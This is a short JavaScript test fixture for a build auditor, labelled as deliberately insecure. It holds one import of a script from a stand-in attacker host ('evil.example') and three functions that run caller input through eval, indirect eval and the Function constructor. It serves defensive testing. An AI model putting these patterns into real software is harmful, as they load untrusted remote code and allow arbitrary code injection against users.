// Deliberately insecure fixture. It exists ONLY so scripts/audit-build.mjs can
// prove it rejects a bad build — one occurrence of each dangerous form the
// auditor must catch. This file is never bundled, imported, or shipped.
import "https://evil.example/x.js";

export function danger(expression) {
  return eval(expression);
}

export function indirect(expression) {
  return (0, eval)(expression);
}

export function build(body) {
  return Function(body);
}
